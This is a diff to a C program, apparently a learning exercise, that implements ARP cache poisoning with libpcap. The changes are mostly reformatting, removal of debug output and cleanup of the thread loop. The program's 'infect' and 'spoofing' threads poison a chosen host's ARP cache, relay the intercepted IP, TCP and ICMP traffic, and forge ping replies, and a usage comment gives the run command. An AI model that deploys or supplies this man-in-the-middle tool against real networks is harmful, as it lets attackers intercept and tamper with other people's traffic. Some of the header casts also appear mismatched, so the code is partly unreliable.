@@ -1,3 +1,6 @@
+// ubuntu - command : gcc -pthread -o test test.c -lpcap 
+// sudo ./arp ens33 192.168.196.166 192.168.196.2
+
 #include <pthread.h>
 #include <pcap.h>
 #include <stdio.h>
@@ -83,34 +86,34 @@ void ping_reply (u_char *packet, struct in_addr sendip, struct in_addr targetip)
 void my_info(char *dev)
 {
 		int fd,i;
-        struct ifreq ifrq;              // net/if.h에 정의
-       	struct sockaddr_in * sin;       // in.h
+        	struct ifreq ifrq;              // net/if.h에 정의
+       		struct sockaddr_in * sin;       // in.h
 		
 		printf("Getting my info...\n");
 		fd = socket(AF_INET, SOCK_DGRAM, 0);
-        strcpy(ifrq.ifr_name, dev);
+        	strcpy(ifrq.ifr_name, dev);
 
-        if(ioctl(fd, SIOCGIFHWADDR, &ifrq) < 0)
-              	perror("ioctl error");
+        	if(ioctl(fd, SIOCGIFHWADDR, &ifrq) < 0)
+              		perror("ioctl error");
       
 		memcpy(my_mac, ifrq.ifr_hwaddr.sa_data,6);
 		printf("My MAC address : ");
 		for(i=0;i<6;i++)
-        {
-                printf("%02X", my_mac[i]); // mac address
-                if(i==5) break;
-                printf(":");
-        }
-        printf("\n");
+        	{
+               		printf("%02X", my_mac[i]); // mac address
+               		if(i==5) break;
+               		printf(":");
+       		}
+        	printf("\n");
 		
-	    if(ioctl(fd, SIOCGIFADDR, &ifrq) < 0)
-                perror("ioctl error");
+	    	if(ioctl(fd, SIOCGIFADDR, &ifrq) < 0)
+                	perror("ioctl error");
                 	
-	    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
+	   	sin = (struct sockaddr_in *)&ifrq.ifr_addr;
 		my_ip = sin->sin_addr;
-	    printf("My IP address : %s\n", inet_ntoa(my_ip));  // sin_addr : ip 주소 나타내는 32 비트 정수 타입
+	    	printf("My IP address : %s\n", inet_ntoa(my_ip));  // sin_addr : ip 주소 나타내는 32 비트 정수 타입
 		
-        close(fd);
+        	close(fd);
 }
 
 int checking(u_char *packet, struct in_addr send_ip)
@@ -131,11 +134,11 @@ int checking(u_char *packet, struct in_addr send_ip)
 		if(cnt > 1)
 		{
 			for(i=0;i<6;i++)
-				if(target_mac[i] != ethhdr->ether_dhost[i])
-				{
-					check = 1;
-					break;
-				}
+			if(target_mac[i] != ethhdr->ether_dhost[i])
+			{
+				check = 1;
+				break;
+			}
 		}
 		cnt++;
 
@@ -194,14 +197,14 @@ int checking(u_char *packet, struct in_addr send_ip)
 
 void sender_info(char *dev, char *s_ip)
 {
-	int i,check;
+		int i,check;
      
-	char errbuf[PCAP_ERRBUF_SIZE];
+		char errbuf[PCAP_ERRBUF_SIZE];
 
-	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
+		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
 		
-	if (handle == NULL) 
-		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		if (handle == NULL) 
+			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
       
 		struct pcap_pkthdr* header;
 		u_char t_packet[42];			// ethernet(14) + arp(28)
@@ -246,8 +249,8 @@ void sender_info(char *dev, char *s_ip)
 				{
 					buf_mac[i]=arphdr->arp_sha[i];
 					printf("%02X", buf_mac[i]);	
-                    if(i==5) break;
-                    printf(":");
+                    			if(i==5) break;
+                    			printf(":");
 				}
 
 				printf("\n");
@@ -277,19 +280,19 @@ void relay_packet(u_char *packet)
 
 void * infect(void *arg)
 {
-	char **argv;
-	argv = (char**)arg;
-	char *dev = argv[1];
-	char *sender = argv[2];
-	char *target = argv[3];
-	int i, check;
+		char **argv;
+		argv = (char**)arg;
+		char *dev = argv[1];
+		char *sender = argv[2];
+		char *target = argv[3];
+		int i, check;
 
-	char errbuf[PCAP_ERRBUF_SIZE];
+		char errbuf[PCAP_ERRBUF_SIZE];
 
-	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
+		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
 		
-	if (handle == NULL) 
-		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		if (handle == NULL) 
+			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
         
 		struct pcap_pkthdr* header;
 		u_char t_packet[42];			// ethernet(14) + arp(28)
@@ -340,109 +343,96 @@ void * spoofing(void * arg)
 		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
     
 	
-		struct in_addr send_ip;
-		struct in_addr target_ip;
+	struct in_addr send_ip;
+	struct in_addr target_ip;
 						
-		if(inet_aton(sender, &send_ip)==0)
-				printf("IP error\n");
+	if(inet_aton(sender, &send_ip)==0)
+		printf("IP error\n");
 
-		if(inet_aton(target, &target_ip)==0)
-			printf("IP error\n");
+	if(inet_aton(target, &target_ip)==0)
+		printf("IP error\n");
 
-			struct pcap_pkthdr* recv_h;
-			u_char* recv_p;
-			int res = pcap_next_ex(handle, &recv_h, &recv_p);
+	struct pcap_pkthdr* recv_h;
+	u_char* recv_p;
+	int res = pcap_next_ex(handle, &recv_h, &recv_p);
 		
-			if(res > 0)
-			{
-				ethhdr = (struct libnet_ethernet_hdr *)recv_p;
-				arphdr = (struct ether_arp *)(recv_p + 14); 
-				iphdr = (struct libnet_ipv4_hdr *)(recv_p + 14);
+	if(res > 0)
+	{
+		ethhdr = (struct libnet_ethernet_hdr *)recv_p;
+		arphdr = (struct ether_arp *)(recv_p + 14); 
+		iphdr = (struct libnet_ipv4_hdr *)(recv_p + 14);
 			
-				len = 14 + iphdr->ip_hl*4;
+		len = 14 + iphdr->ip_hl*4;
 
-				if (checking(recv_p, send_ip) == -1)		// arp request == -1 
-				{
-					infect(argv);
-					printf("infect!\n");
-				}
+		if (checking(recv_p, send_ip) == -1)		// arp request == -1 
+		{
+			infect(argv);
+			printf("infect!\n");
+		}
 
-				else if(checking(recv_p, send_ip) == 2)		// ip packet == 2
-				{
-					relay_packet(recv_p);
+		else if(checking(recv_p, send_ip) == 2)		// ip packet == 2
+		{
+			relay_packet(recv_p);
 					
-					check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
+			check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
 					
-					if(check == -1)
-					{
-						pcap_perror(handle,0);
-						pcap_close(handle);
-					}		
+			if(check == -1)
+			{
+				pcap_perror(handle,0);
+				pcap_close(handle);
+			}		
 
-					printf("relay packet\n");
-				}
+			printf("relay packet\n");
+		}
 
-				else if(checking(recv_p, send_ip) == 3)
-				{
-					tcphdr = (struct libnet_icmpv4_hdr *)(recv_p + 14 + iphdr->ip_hl*4);
-					relay_packet(recv_p);
-					len = len + tcphdr->th_off*4;
+		else if(checking(recv_p, send_ip) == 3)
+		{
+			tcphdr = (struct libnet_icmpv4_hdr *)(recv_p + 14 + iphdr->ip_hl*4);
+			relay_packet(recv_p);
+			len = len + tcphdr->th_off*4;
 					
-					check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
+			check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
 					
-					if(check == -1)
-					{
-						pcap_perror(handle,0);
-						pcap_close(handle);
-					}		
+			if(check == -1)
+			{
+				pcap_perror(handle,0);
+				pcap_close(handle);
+			}		
 
-					printf("relay packet\n");
-				}
+			printf("relay packet\n");
+		}
 
-				else if(checking(recv_p, send_ip) == 4)
-				{
-					icmphdr = (struct libnet_tcp_hdr *)(recv_p + 14 + iphdr->ip_hl*4);
-					relay_packet(recv_p);
-					len = len + 8;			// icmp header size =8
+		else if(checking(recv_p, send_ip) == 4)
+		{
+			icmphdr = (struct libnet_tcp_hdr *)(recv_p + 14 + iphdr->ip_hl*4);
+			relay_packet(recv_p);
+			len = len + 8;			// icmp header size =8
 					
-					check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
+			check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
 					
-					if(check == -1)
-					{
-						pcap_perror(handle,0);
-						pcap_close(handle);
-					}		
+			if(check == -1)
+			{
+				pcap_perror(handle,0);
+				pcap_close(handle);
+			}		
 
-					printf("relay packet\n");
+			printf("relay packet\n");
 					
-					for(i=0;i<22+iphdr->ip_hl*4;i++)
-						printf("%d ",recv_p[i]);
-					printf("\n");
-					for(i=0;i<22+iphdr->ip_hl*4;i++)
-						printf("%x ",recv_p[i]);
+				
+			ping_reply (recv_p, send_ip, iphdr->ip_dst);
 
+			check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
 					
-					ping_reply (recv_p, send_ip, iphdr->ip_dst);
+			if(check == -1)
+			{
+				pcap_perror(handle,0);
+				pcap_close(handle);
+			}		
 
-					printf("\n-------------------------------\n");
-					for(i=0;i<22+iphdr->ip_hl*4;i++)
-						printf("%d ",recv_p[i]);
-					printf("\n");
-					for(i=0;i<22+iphdr->ip_hl*4;i++)
-						printf("%x ",recv_p[i]);
+			printf("ping reply\n");
 
-					check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
-					
-					if(check == -1)
-					{
-						pcap_perror(handle,0);
-						pcap_close(handle);
-					}		
-
-					printf("ping reply\n");
-
-				}
-			}
+		}
+	}
 
 
 	pcap_close(handle);
@@ -478,47 +468,27 @@ int main(int argc, char* argv[])
 
 		while(1)
 		{
+        		tid = pthread_create(&p_thread[0], NULL, infect, (void*)argv);
+        		if(tid < 0)
+			{
+            			perror("Infect_sender error");
+            			exit(0);
+        		}
+			sleep(1);
+
+		 	tid = pthread_create(&p_thread[1], NULL, spoofing, (void*)argv);
+        		if(tid < 0)
+			{
+            			perror("Spoofing_sender error");
+            			exit(0);
+        		}
+			sleep(1);
+			
+			pthread_join(p_thread[0], NULL);
+       		 	pthread_join(p_thread[1], NULL);
+
 		
-        tid = pthread_create(&p_thread[0], NULL, infect, (void*)argv);
-        if(tid < 0){
-            perror("Infect_sender error");
-            exit(0);
-        }
-		sleep(1);
-
-		 tid = pthread_create(&p_thread[1], NULL, spoofing, (void*)argv);
-        if(tid < 0){
-            perror("Spoofing_sender error");
-            exit(0);
-        }
-		sleep(1);
-		
-
-		/*
-		sender_info(dev, sender);
-		argv[2] = target;
-		argv[3] = sender;
-		
-		tid = pthread_create(&p_thread[2], NULL, infect, (void*)argv);
-        if(tid < 0){
-            perror("Infect_target error");
-            exit(0);
-        }
-		sleep(1);
-
-
-		tid = pthread_create(&p_thread[3], NULL, spoofing, (void*)argv);
-        if(tid < 0){
-            perror("Spoofing_target error");
-            exit(0);
-        }
-		sleep(1);*/
-
-        pthread_join(p_thread[0], NULL);
-        pthread_join(p_thread[1], NULL);
-		//pthread_join(p_thread[2], NULL);
-		//pthread_join(p_thread[3], NULL);
 		}
 
-    return 0;
+    		return 0;
 }
